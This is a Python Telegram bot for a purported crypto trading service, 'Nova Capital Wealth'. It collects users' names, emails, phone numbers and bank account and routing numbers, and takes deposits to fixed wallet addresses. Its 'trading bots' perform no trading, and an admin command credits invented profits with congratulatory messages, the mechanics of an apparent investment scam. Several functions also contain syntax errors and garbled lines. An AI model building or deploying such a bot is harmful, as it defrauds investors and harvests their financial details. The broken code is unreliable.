import os
import logging
from typing import Dict, Any
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    filters, ContextTypes, ConversationHandler
)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# States for conversation handler
(WAITING_NAME, WAITING_EMAIL, WAITING_PHONE, MAIN_MENU, 
 DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WITHDRAW_CRYPTO_ADDRESS,
 WITHDRAW_BANK_NAME, WITHDRAW_ACCOUNT, WITHDRAW_ROUTING) = range(11)

# Bot configuration
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', 0))

# In-memory storage
user_data: Dict[int, Dict[str, Any]] = {}
crypto_addresses = {
    'Bitcoin': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
    'Ethereum': '0x1234567890abcdef1234567890abcdef12345678',
    'USDT': '0xabcdef1234567890abcdef1234567890abcdef12'
}

trading_bots = {
    'NCW Trading Bot': 'Custom-built algorithm by Nova Capital Wealth for optimal profits.',
    'AlphaTrend': 'Conservative strategy focusing on steady market trends.',
    'BetaGrowth': 'Balanced approach for moderate risk and consistent growth.',
    'GammaProfit': 'Aggressive strategy targeting high returns in volatile markets.',
    'DeltaStable': 'Diversified portfolio for long-term stability and growth.'
}

def get_user_data(user_id: int) -> Dict[str, Any]:
    """Get user data with default values"""
    if user_id not in user_data:
        user_data[user_id] = {
            'name': '',
            'email': '',
            'phone': '',
            'balance': 0.0,
            'deposit': 0.0,
            'profit': 0.0,
            'withdrawal': 0.0,
            'approved': False,
            'active_bot': None,
            'pending_deposit': 0.0,
            'pending_withdrawal': 0.0
        }
    return user_data[user_id]

def create_cancel_keyboard():
    """Create a keyboard with cancel button"""
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Send welcome message with start button"""
    keyboard = [
        [InlineKeyboardButton("🚀 Start Now", callback_data='start_registration')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = """🌟 **Welcome to Nova Capital Wealth Trading Bot!** 🌟

Your gateway to seamless trading with cutting-edge strategies at Nova Capital Wealth. Ready to unlock your financial potential? Click 'Start Now' to begin!"""
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
    return WAITING_NAME

async def start_registration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start user registration process"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "Please enter your full name:",
        reply_markup=create_cancel_keyboard()
    )
    return WAITING_NAME

async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get user's full name"""
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    user_info['name'] = update.message.text.strip()
    
    await update.message.reply_text(
        "Please enter your email address:",
        reply_markup=create_cancel_keyboard()
    )
    return WAITING_EMAIL

async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get user's email"""
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    user_info['email'] = update.message.text.strip()
    
    await update.message.reply_text(
        "Please enter your phone number:",
        reply_markup=create_cancel_keyboard()
    )
    return WAITING_PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get user's phone and complete registration"""
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    user_info['phone'] = update.message.text.strip()
    
    admin_message = f"""📝 **New User Registration**

👤 **Name:** {user_info['name']}
📧 **Email:** {user_info['email']}
📱 **Phone:** {user_info['phone']}
🆔 **User ID:** {user_id}

Please create an account for this user on novacapitalwealthpro.com and send them the login details.
Use /approveuser {user_id} to approve this account."""
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=admin_message,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to send admin notification: {e}")
    
    keyboard = [
        [InlineKeyboardButton("✅ Proceed", callback_data='proceed_to_menu')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"Welcome, {user_info['name']}! Your registration is awaiting admin confirmation. You'll be notified once approved.",
        reply_markup=reply_markup
    )
    
    return MAIN_MENU

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Display the main menu"""
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    
    if update.callback_query:
        query = update.callback_query
        await query.answer()
    
    menu_text = f"""🎉 **Welcome, {user_info['name']}!** 🎉

💰 **Available Balance:** ${user_info['balance']:.2f}
📈 **Deposit:** ${user_info['deposit']:.2f}
📊 **Profit:** ${user_info['profit']:.2f}
📉 **Withdrawal:** ${user_info['withdrawal']:.2f}"""
    
    keyboard = [
        [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
         InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],
        [InlineKeyboardButton("🤖 Copy Trade", callback_data='copy_trade'),
         InlineKeyboardButton("🎯 Stake", callback_data='stake')],
        [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
         InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.message.reply_text(menu_text, reply_markup=reply_markup, parse_mode='Markdown')
    
    return MAIN_MENU

async def handle_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle deposit request"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("₿ Crypto", callback_data='deposit_crypto')],
        [InlineKeyboardButton("❌ Cancel", callback_data='back_to_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "How would you like to deposit?",
        reply_markup=reply_markup
    )
    return MAIN_MENU

async def show_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show cryptocurrency options"""
    query = update.callback_query
    await query.answer()
    
    keyboard = []
    for crypto in crypto_addresses.keys():
        keyboard.append([InlineKeyboardButton(f"{crypto}", callback_data=f'crypto_select_{crypto}')])
    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='back_to_menu')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "Select your preferred cryptocurrency:",
        reply_markup=reply_markup
    )
    return MAIN_MENU

async def handle_crypto_selection(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle cryptocurrency selection"""
    query = update.callback_query
    await query.answer()
    
    crypto_name = query.data.split('_')[-1]
    context.user_data['selected_crypto'] = crypto_name
    
    await query.edit_message_text(
        f"Enter the amount you want to deposit in USD:",
        reply_markup=create_cancel_keyboard()
    )
    return DEPOSIT_AMOUNT

async def get_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get deposit amount and show payment details"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Amount must be positive")
        
        context.user_data['deposit_amount'] = amount
        crypto_name = context.user_data['selected_crypto']
        address = crypto_addresses[crypto_name]
        
        keyboard = [
            [InlineKeyboardButton("📋 Copy Address", callback_data=f'copy_address_{crypto_name}')],
            [InlineKeyboardButton("✅ I Have Made Payment", callback_data='payment_made')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = f"""💳 **Deposit Details**

💰 **Amount:** ${amount:.2f}
🪙 **Cryptocurrency:** {crypto_name}
🏦 **Wallet Address:** `{address}`

⚠️ **Security Warning:** Never share your payment details publicly. Only send to the address above."""
        
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='Markdown')
        return MAIN_MENU
        
    except ValueError:
        await update.message.reply_text(
            "Please enter a valid amount (numeric value only):",
            reply_markup=create_cancel_keyboard()
        )
        return DEPOSIT_AMOUNT

async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Send crypto address as copyable text"""
    query = update.callback_query
    await query.answer()
    
    crypto_name = query.data.split('_')[-1]
    address = crypto_addresses[crypto_name]
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"{crypto_name} Address:\n`{address}`",
        parse_mode='Markdown'
    )
    return MAIN_MENU

async def payment_made(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle payment confirmation"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "Please send a screenshot of your payment as proof:",
        reply_markup=create_cancel_keyboard()
    )
    return DEPOSIT_PROOF

async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get deposit proof screenshot and notify admin with confirm button"""
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    amount = context.user_data.get('deposit_amount', 0)
    crypto_name = context.user_data.get('selected_crypto', 'Unknown')
    
    context.user_data['deposit_message_id'] = update.message.message_id if update.message else None
    
    admin_message = f"""💳 **New Deposit Request**

👤 **User:** {user_info['name']} (ID: {user_id})
💰 **Amount:** ${amount:.2f}
🪙 **Crypto:** {crypto_name}
📱 **Phone:** {user_info['phone']}
📧 **Email:** {user_info['email']}

Click 'Approve' to confirm this deposit or use /approve {user_id} {amount:.2f}."""
    
    keyboard = [
        InlineKeyboardButton("✅ Approve", callback_data=f'confirm_deposit_{user_id}_{amount}')
    ]
    reply_markup = InlineKeyboardMarkup([keyboard])
    
    try:
        await message = await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=admin_message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        context.user_data['admin_deposit_message_id'] = message.message_id
        
        if update.message.photo:
            await context.bot.forward_message(
                chat_id=ADMIN_USER_ID,
                from_chat_id=update.effective_chat.id,
                message_id=update.message.message_id
            )
        
    except Exception as e:
        logger.error(f"Failed to send admin notification: {e}")
    
    user_info['pending_deposit'] = amount
    
    await update.message.reply_text(
        "Your deposit is pending admin confirmation. You'll be notified once it's processed.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
    )
    
    return MAIN_MENU

async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle admin's deposit confirmation via button"""
    query = update.callback_query
    await query.answer()
    
    if update.effective_user.id != ADMIN_USER_ID:
        await query.edit_message_text("❌ Unauthorized access.")
        return MAIN_MENU
    
    try:
        _, user_id_str, amount_str = query.data.split('_')
        user_id = int(user_id_str)
        amount = float(amount_str)
        
        if user_id not in user_data:
            await query.edit_message_text("❌ User not found.")
            return MAIN_MENU
        
        user_info = get_user_data(user_id)
        user_info['balance'] += amount
        user_info['deposit'] += amount
        user_info['pending_deposit'] = 0
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
            )
        except Exception as e:
            logger.error(f"Failed to notify user {user_id}: {e}")
        
        # Update admin's notification message
        await query.edit_message_text(
            f"{query.message.text}\n\n✅ **Deposit Approved** for user {user_id}."
        )
        
        return MAIN_MENU
        
    except ValueError:
        await query.edit_message_text("❌ Invalid format.")
        return MAIN_MENU

async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle withdrawal request"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("₿ Crypto", callback_data='withdraw_crypto')],
        [InlineKeyboardButton("🏦 Bank Transfer", callback_data='withdraw_bank')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "How would you like to withdraw?",
        reply_markup=reply_markup
    )
    return MAIN_MENU

async def withdraw_crypto_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get withdrawal amount for crypto"""
    query = update.callback_query
    await query.answer()
    
    context.user_data['withdrawal_method'] = 'crypto'
    
    await query.edit_message_text(
        "Enter the amount you want to withdraw in USD:",
        reply_markup=create_cancel_keyboard()
    )
    return MAIN_MENU

async def withdraw_bank_amount(update: amount Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Withdraw amount for bank transfer"""
    query = update.callback_query
    await query.answer()
    
    context.user_data['withdrawal_method'] = 'bank'
    
    await query.edit_message_text(
        "Enter the amount you want to withdraw in USD:",
        reply_markup=create_cancel_keyboard()
    )
    return MAIN_MENU

async def get_withdraw_amount(update: Amount, context: Update ContextTypes.DEFAULT_TYPE) -> int:
    """Process withdrawal amount"""
    try:
        amount = float(update.message.text)
        user_id = update.effective_user.id
        user_info = get_user_data(user_id)
        
        if amount <= 0:
            raise ValueError("Amount must be positive")
        
        if amount > user_info['balance']:
            await update.message.reply_text(
                f"Insufficient balance. Your available balance is ${user_info['balance']:.2f}",
                reply_markup=createcancel_keyboard()
            )
            return WITHDRAW_AMOUNT
        
        context.user_data['withdraw_amount'] = amount
        
        if context.user_data['withdrawal_method'] == 'crypto':
            await update.message.reply_text(
                "Please enter your cryptocurrency wallet address:",
                reply_markup=createcancel_keyboard()
            )
            return WITHDRAW_CRYPTO_ADDRESS
        else:
            await update.message.reply_text(
                "Please enter your bank name:",
                reply_markup=create_cancel_keyboard()
            )
            return WITHDRAW_BANK_NAME
            
    except ValueError:
        await update.message.reply_text(
            "Please enter a valid amount (numeric value only):",
            reply_markup=create_cancel_keyboard()
        )
        return WITHDRAW_AMOUNT

async def get_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get crypto address for withdrawal"""
    context.user_data['crypto_address'] = update.message.text.strip()
    
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    amount = context.user_data['withdraw_amount']
    address = context.user_data['crypto_address']
    
    admin_message = f"""💸 **Crypto Withdrawal Request**

    👤 **User:** **User** {user_info['name']} (ID: {user_id})
    💰 **Amount:** ${amount:.2f}
    🏦 **Crypto Address:** {address}
    📞 **Phone:** {user_info['phone']}
    📧 **Email:** {user_info['email']}

Use /approvewithdrawal {user_id} {amount} to approve this withdrawal."""
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=admin_message,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to send admin notification: {e}")
    
    user_info['pending_withdrawal'] = amount
    
    await update.message.reply_text(
        "Your withdrawal request is pending admin confirmation.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])])
    
    return MAIN_MENU

async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get bank name"""
    context.user_data['bank_name'] = update.message.text.strip()
    
    await update.message.reply_text(
        "Please enter your account number:",
        reply_markup=create_cancel_keyboard()
    )
    return WITHDRAW_ACCOUNT

async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get account number"""
    context.user_data['account_number'] = update.message.text.strip()
    
    await update.message.reply_text(
        "Please enter your routing number:",
        reply_markup=create_cancel_keyboard()
    )
    return WITHDRAW_ROUTING

async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get routing number and process bank withdrawal"""
    context.user_data['routing_number'] = update.message.text.strip()
    
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    amount = context.user_data['withdraw_amount']
    bank_name = context.user_data['bank_name']
    account_number = context.user_data['account_number']
    routing_number = context.user_data['routing_number']
    
    admin_message = f"""💸 **Bank Withdrawal Request**

👤 **User:** {user_info['name']} (ID: {user_id})
💰 **Amount:** $amount{:.2f}
🏦 **Bank:** {bank_name}
🔢 **Account:** {account_number}
🔢 **Amount:** ${routing_number}
📱 **Phone:** {user_info['phone']}
📧 **Email:** {user_info['email']}

Use /approvewithdrawal {user_id} {amount} to approve this withdrawal."""
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=admin_message,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to send admin {notification}: {e}")
    
    user_info['pending_withdrawal'] = amount
    
    await update.message.reply_text(
        "Your withdrawal request is pending admin confirmation.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
    )
    return MAIN_MENU

async def show_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show copy trading options"""
    query = update.callback_query
    await query.answer()
    
    keyboard = []
    for bot_name in trading_bots.keys():
        keyboard.append([InlineKeyboardButton(f"🤖 {bot_name}", callback_data=f'select_bot_{bot_name}')])
    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='back_to_menu')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "🤖 **Select Trading Bot**\n\nChoose a trading bot to copy their strategies:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return MAIN_MENU

async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle trading bot selection"""
    query = update.callback_query
    await query.answer()
    
    bot_name = query.data.replace('select_bot_' '', '')
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    
    if user_info['active_bot'] == bot_name:
        await query.edit_message_text(
            f"You are already using {bot_name}. Please wait while it generates profits.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
        )
    else:
        user_info['active_bot'] = bot_name
        description = trading_bots.get(bot_name)
        
        message = f"""✅ **{bot_name} Activated!**

📋 **Description:** {description}

Our refined strategy will keep you in profits. Monitor your progress in the main menu."""
        
        await query.edit_message_text(
            message,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]]),
            parse_mode='Markdown'
        )
    
    return MAIN_MENU

async def handle_stake(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle staking (placeholder)"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🎯 Staking is coming soon! Stay tuned for this exciting feature.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
    )
    return MAIN_MENU

async def visit_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle website visit"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    
    if not user_info['approved']:
        await query.edit_message_text(
            "Please wait for your account to be created. You'll be notified once approved.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
        )
    else:
        keyboard = [
            [InlineKeyboardButton("🌐 Visit Nova Capital Wealth", url='https://novacapitalwealthpro.com')],
            [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🌐 **Visit Our Website**\n\nClick to access the button below to access your trading account:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    return MAIN_MENU

async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Refresh and show updated balance"""
    query = update.callback_query
    await query.answer("Balance refreshed! 🔄")
    
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    
    menu_text = f"""🎉 **Welcome, {user_info['name']}!** 🎉

💰 **Available Balance:** ${user_info['balance']:.2f}
📈 **Deposit:** ${user_info['deposit']:.2f}
📊 **Profit:** ${user_info['profit']:.2f}
📉 **Withdrawal:** ${user_info['withdrawal']:.2f}"""
    
    keyboard = [
        [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
         InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],
        [InlineKeyboardButton("🤖 Copy Trade", callback_data='copy_trade'),
         InlineKeyboardButton("🎯 Stake", callback_data='stake')],
        [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
         InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode='Markdown')
    
    return MAIN_MENU

async def cancel_operation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel current operation"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "❌ Operation cancelled. Use /start to begin again."
    )
    
    return ConversationHandler.END

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Return to main menu"""
    return await show_main_menu(update, context)

async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Get user's Telegram ID"""
    user_id = update.effective_user.id
    await update.message.reply_text(f"Your User ID is: {user_id}")

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show admin panel with options"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    panel_text = """🛠 **NCW Trading Bot Admin Panel** 🛠

Welcome to the admin control center. Manage users, transactions, and system settings below."""
    
    keyboard = [
        [InlineKeyboardButton("👥 List Users", callback_data='admin_list_users')],
        [InlineKeyboardButton("✅ Approve User", callback_data='admin_approve_user')],
        [InlineKeyboardButton("💳 Approve Deposit", callback_data='admin_approve_deposit')],
        [InlineKeyboardButton("💸 Approve Withdrawal", callback_data='admin_approve_withdrawal')],
        [InlineKeyboardButton("📈 Update Profit", callback_data='admin_update_profit')],
        [InlineKeyboardButton("🪙 Update Crypto Address", callback_data='admin_update_crypto')],
        [InlineKeyboardButton("ℹ️ Help", callback_data='admin_help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(panel_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_admin_action(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin panel button actions"""
    query = update.callback_query
    await query.answer()
    
    if update.effective_user.id != ADMIN_USER_ID:
        await query.edit_message_text("❌ Unauthorized access.")
        return
    
    action = query.data
    
    if action == 'admin_list_users':
        if not user_data:
            await query.edit_message_text("📝 No users registered yet.")
            return
        
        users_list = """👥 **Registered Users** 👥

Below is a detailed list of all registered users:\n\n"""
        for user_id, data in user_data.items():
            status = "✅ Approved" if data['approved'] else "⏳ Pending"
            bot = data['active_bot'] if data['active_bot'] else "None"
            pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
            pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
            
            users_list += f"🆔 **{user_id}** - {data['name']}\n"
            users_list += f"📧 {data['email']}\n"
            users_list += f"📱 {data['phone']}\n"
            users_list += f"💰 Balance: ${data['balance']:.2f}\n"
            users_list += f"📈 Deposit: ${data['deposit']:.2f}\n"
            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
            users_list += f"📊 Status: {status}\n"
            users_list += f"🤖 Active Bot: {bot}\n"
            users_list += f"💳 Pending Deposit: {pending_dep}\n"
            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
        
        if len(users_list) > 4000:
            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
            for part in parts:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=part,
                    parse_mode='Markdown'
                )
        else:
            await query.edit_message_text(users_list, parse_mode='Markdown')
    
    elif action == 'admin_approve_user':
        await query.edit_message_text(
            "Please enter the user ID to approve (use /getid to find IDs):",
            reply_markup=create_cancel_keyboard()
        )
        context.user_data['admin_action'] = 'approve_user'
    
    elif action == 'admin_approve_deposit':
        await query.edit_message_text(
            "Please enter: /approve <user_id> <amount>",
            reply_markup=create_cancel_keyboard()
        )
        context.user_data['admin_action'] = 'approve_deposit'
    
    elif action == 'admin_approve_withdrawal':
        await query.edit_message_text(
            "Please enter: /approvewithdrawal <user_id> <amount>",
            reply_markup=create_cancel_keyboard()
        )
        context.user_data['admin_action'] = 'approve_withdrawal'
    
    elif action == 'admin_update_profit':
        await query.edit_message_text(
            "Please enter: /updateprofit <user_id> <amount>",
            reply_markup=create_cancel_keyboard()
        )
        context.user_data['admin_action'] = 'update_profit'
    
    elif action == 'admin_update_crypto':
        await query.edit_message_text(
            "Please enter: /updatecrypto <crypto_name> <address>",
            reply_markup=create_cancel_keyboard()
        )
        context.user_data['admin_action'] = 'update_crypto'
    
    elif action == 'admin_help':
        help_text = """🦺 **Admin Panel Guide** 🛠

Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:

👥 **List Users**
- View all registered users with details (ID, name, email, balance, etc.).
- Use the 'List Users' button or /listusers.

✅ **Approve User**
- Approve a user's account to grant access to trading features.
- Command: /approveuser <user_id>
- Example: /approveuser 123456789

💳 **Approve Deposit**
- Confirm a user's deposit to update their balance.
- Command: /approve <user_id> <amount>
- Example: /approve 123456789 1000.50
- Alternatively, use the 'Approve' button in deposit notifications.

💸 **Approve Withdrawal**
- Process a user's withdrawal request.
- Command: /approvewithdrawal <user_id> <amount>
- Example: /approvewithdrawal 123456789 500.25

📈 **Update Profit**
- Add profit to a user's account based on trading bot performance.
- Command: /updateprofit <user_id> <amount>
- Example: /updateprofit 123456789 250.75

🪙 **Update Crypto Address**
- Change the wallet address for a cryptocurrency.
- Command: /updatecrypto <crypto_name> <address>
- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

ℹ️ **Help**
- Review this guide anytime with /adminhelp or the 'Help' button.

**Tips:**
- Use /getid to find a user's ID.
- Check deposit notifications for pending approvals.
- All commands are case-sensitive."""
        await query.edit_message_text(help_text, parse_mode='Markdown')

async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to approve deposits"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    try:
        args = context.args
        if len(args) != 2:
            await update.message.reply_text("Usage: /approve <user_id> <amount>")
            return
        
        user_id = int(args[0])
        amount = float(args[1])
        
        if user_id not in user_data:
            await update.message.reply_text("❌ User not found.")
            return
        
        user_info = user_data[user_id]
        user_info['balance'] += amount
        user_info['deposit'] += amount
        user_info['pending_deposit'] = 0
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
            )
        except Exception as e:
            logger.error(f"Failed to notify user {user_id}: {e}")
        
        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id}.")
        
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")

async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to approve withdrawals"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    try:
        args = context.args
        if len(args) != 2:
            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
            return
        
        user_id = int(args[0])
        amount = float(args[1])
        
        if user_id not in user_data:
            await update.message.reply_text("❌ User not found.")
            return
        
        user_info = user_data[user_id]
        
        if amount > user_info['balance']:
            await update.message.reply_text("❌ Insufficient balance.")
            return
        
        user_info['balance'] -= amount
        user_info['withdrawal'] += amount
        user_info['pending_withdrawal'] = 0
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
            )
        except Exception as e:
            logger.error(f"Failed to notify user {user_id}: {e}")
        
        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id}.")
    
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")

async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to update user profits"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    try:
        args = context.args
        if len(args) != 2:
            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
            return
        
        user_id = int(args[0])
        amount = float(args[1])
        
        if user_id not in user_data:
            await update.message.reply_text("❌ User not found.")
            return
        
        user_info = user_data[user_id]
        user_info['profit'] += amount
        user_info['balance'] += amount
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
            )
        except Exception as e:
            logger.error(f"Failed to notify user {user_id}: {e}")
        
        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id}.")
    
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")

async def update_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to update crypto addresses"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    try:
        args = context.args
        if len(args) != 2:
            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
